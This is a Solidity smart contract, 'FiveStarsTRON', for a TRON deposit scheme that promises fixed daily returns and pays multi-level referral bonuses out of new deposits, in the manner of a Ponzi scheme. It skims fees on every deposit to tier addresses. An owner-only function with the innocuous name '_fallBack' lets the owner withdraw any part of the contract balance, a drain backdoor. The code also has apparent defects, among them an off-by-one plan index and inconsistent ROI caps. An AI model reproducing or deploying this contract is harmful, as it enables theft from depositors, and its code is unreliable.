//SourceUnit: FiveStarsTRON.sol

/**
* www.5starsTron.com
*/
pragma solidity ^0.5.9;

contract FiveStarsTRON {
    using SafeMath for uint;
    struct Plan{
        uint minDeposit;
        uint maxDeposit;
        uint dailyRate;
        uint maxRoi;
    }

    struct Deposit {
        uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct Player {
        address refBy;
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_match_bonus;
        uint total_invested;
        uint last_payout;
        uint total_withdrawn;
        Deposit[] deposits;
    }

    address payable public owner;

    address payable private contract_;

    address payable public tier1_;
    address payable public tier2_;
    address payable public tier3_;

    uint public invested;
    uint public earnings;
    uint public withdrawn;
    uint public direct_bonus;
    uint public match_bonus;
    bool public compounding = true;

    uint internal constant direct_bonus_ = 15;
    uint internal constant _tierR = 5;
    uint internal constant _divR = 2;

    uint[] public match_bonus_;

    // mapping(uint => Plan) internal plans;

    Plan[] public plans;

    mapping(address => Player) public players;

    event ReferralBonus(address indexed addr, address indexed refBy, uint bonus);
    event NewDeposit(address indexed addr, uint amount, uint tarif);
    event MatchPayout(address indexed addr, address indexed from, uint amount);
    event Withdraw(address indexed addr, uint amount);

    constructor() public {
        contract_ = msg.sender;

        plans.push(Plan(10000000, 9999999999, 289351, 300));
        plans.push(Plan(10000000000, 29999999999, 347222, 450));
        plans.push(Plan(30000000000, 49999999999, 462962, 600));
        plans.push(Plan(50000000000, 99999999999, 578703, 7510));
        plans.push(Plan(100000000000, 1000000000000000, 810185, 1001));

        match_bonus_.push(30); // l1
        match_bonus_.push(20); // l2
        match_bonus_.push(10); // l3&4
        match_bonus_.push(10); // l3&4
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
        match_bonus_.push(5); // l5-10
    }


    /**
     * Modifiers
     * */
    modifier hasDeposit(address _userId){
        require(players[_userId].deposits.length > 0);
        _;
    }

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    /**
     * Internal Functions
     * */
    function _getPack(uint _amount) private view returns(uint){
        require(_amount >= plans[0].minDeposit, 'Wrong amount');
        if(_amount >= plans[0].minDeposit && _amount <= plans[1].maxDeposit){
            return 1;
        }
        if(_amount >= plans[1].minDeposit && _amount <= plans[2].maxDeposit){
            return 2;
        }
        if(_amount >= plans[2].minDeposit && _amount <= plans[3].maxDeposit){
            return 3;
        }
        if(_amount >= plans[3].minDeposit && _amount <= plans[4].maxDeposit){
            return 4;
        }
        if(_amount >= plans[4].minDeposit){
            return 5;
        }
        else{
            return 1;
        }
    }

    function _matchingPayout(address _userId, uint _amount) private {
        address up = players[_userId].refBy;

        for(uint i = 0; i < match_bonus_.length; i++) {
            if(up == address(0)) {
                players[contract_].available += _amount.mul(match_bonus_[i]).div(100);
                break;
            }

            uint bonus = _amount.mul(match_bonus_[i]).div(100);

            players[up].available += bonus;
            players[up].total_match_bonus += bonus;
            players[up].total_earnings += bonus;

            match_bonus += bonus;
            earnings += bonus;

            emit MatchPayout(up, _userId, bonus);

            up = players[up].refBy;
        }
    }

    function _payDirectCom(address _refBy, uint _amount) private{
        uint bonus = _amount.mul(direct_bonus_).div(100);
        players[_refBy].available += bonus;
        direct_bonus += bonus;
        earnings += bonus;
        emit ReferralBonus(msg.sender, _refBy, bonus);
    }

    function _setSponsor(address _userId, address _refBy) private {
        if(_userId != _refBy && players[_userId].refBy == address(0) && (_userId != owner
        && _userId != tier1_ && _userId != tier2_ && _userId != tier3_)) {
            if(players[_refBy].deposits.length == 0) {
                _refBy = tier3_;
            }
        }
        else{
            _refBy = contract_;
        }
        players[_userId].refBy = _refBy;
    }

    function _checkout(address _userId) private hasDeposit(_userId){
        Player storage player = players[_userId];
        if(player.deposits.length == 0) return;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;

        for(uint i = 0; i < player.deposits.length; i++){
            Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = plans[dep.planId].dailyRate;
                _Interest = plans[dep.planId].maxRoi.div(100);
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                uint _max = dep.amount.mul(_Interest);
                uint _released = dep.earnings;
                if(_released < _max){
                    _myEarnings += _gross;
                    dep.earnings += _gross;
                    dep.time = now;
                }
            }
        }
        player.available += _myEarnings;
        player.last_payout = now;
        _matchingPayout(_userId, _myEarnings);
    }

    function profitSpread(uint _amount) internal returns(bool){
        uint tier = _amount.mul(_tierR).div(100);
        uint _contract = _amount.mul(_divR).div(100);
        tier1_.transfer(tier);
        tier2_.transfer(tier);
        contract_.transfer(_contract);
        return true;
    }
    /*
    * Only external call
    */

    function deposit(address _refBy) external payable {
        // Receive deposit
        // Pay Direct Referral Commissions
        uint _amount = msg.value;
        address _userId = msg.sender;
        uint _planId = _getPack(_amount);

        require(_planId >= 1 && _planId <= 5, 'Wrong Plan');

        Player storage player = players[_userId];

        _setSponsor(_userId, _refBy);

        player.deposits.push(Deposit({
            planId: _planId,
            amount: _amount,
            earnings: 0,
            time: uint(block.timestamp)
            }));

        player.total_invested += _amount;
        invested += _amount;

        _payDirectCom(_refBy, _amount);

        profitSpread(_amount);

        _checkout(_userId);

        emit NewDeposit(_userId, _amount, _planId);
    }

    function withdraw() external hasDeposit(msg.sender){
        address payable _userId = msg.sender;
        Player storage player = players[_userId];

        require(player.available > 0 && address(this).balance > player.available, "No Funds");

        _checkout(_userId);

        uint amount = player.available;

        player.available = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        _userId.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function reinvest() external hasDeposit(msg.sender){
        // Take available and redeposit for compounding
        address _userId = msg.sender;
        _checkout(_userId);

        Player storage player = players[_userId];
        uint _amount = player.available;
        require(address(this).balance >= _amount);

        player.available = 0;
        player.total_invested += _amount;
        player.total_withdrawn += _amount;
        invested += _amount;
        withdrawn += _amount;

        _payDirectCom(player.refBy, _amount);

        profitSpread(_amount);
    }

    function _getEarnings(address _userId) view external returns(uint) {

        Player storage player = players[_userId];
        if(player.deposits.length == 0) return 0;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;

        for(uint i = 0; i < player.deposits.length; i++){
            Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = plans[dep.planId].dailyRate;
                _Interest = plans[dep.planId].maxRoi;
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                uint _max = dep.amount.mul(_Interest);
                uint _released = dep.earnings;
                if(_released < _max){
                    _myEarnings += _gross;
                }
            }
        }
        return player.available.add(_myEarnings);
    }

    function userInfo(address _userId) view external returns(uint for_withdraw, uint total_invested, uint total_withdrawn, uint total_match_bonus) {
        Player storage player = players[_userId];

        uint _myEarnings = this._getEarnings(_userId).add(player.available);

        return (
        _myEarnings,
        player.total_invested,
        player.total_withdrawn,
        player.total_match_bonus);
    }

    function contractInfo() view external returns(uint _invested, uint _withdrawn, uint _earnings, uint _direct_bonus, uint _match_bonus) {
        return (invested, withdrawn, earnings, direct_bonus, match_bonus);
    }

    /**
     * Restrictied functions
     * */
    function setOwner(address payable _owner) external onlyContract()  returns(bool){
        owner = _owner;
        return true;
    }

    function transferOwnership(address payable _owner) external onlyOwner()  returns(bool){
        owner = _owner;
        return true;
    }

    function setTiers(address payable _tier1, address payable  _tier2, address payable _tier3) external onlyOwner() returns(bool){
        if(_tier1 != address(0)){
            tier1_ = _tier1;
        }
        if(_tier2 != address(0)){
            tier2_ = _tier2;
        }
        if(_tier3 != address(0)){
            tier3_ = _tier3;
        }
        return true;
    }

    function tooggleCompounding() external onlyOwner() returns(bool){
        compounding = !compounding ? true:false;
        return true;
    }

    function _fallBack(uint _amount) external onlyOwner() returns(bool){
        require(address(this).balance >= _amount);
        owner.transfer(_amount);
        return true;
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}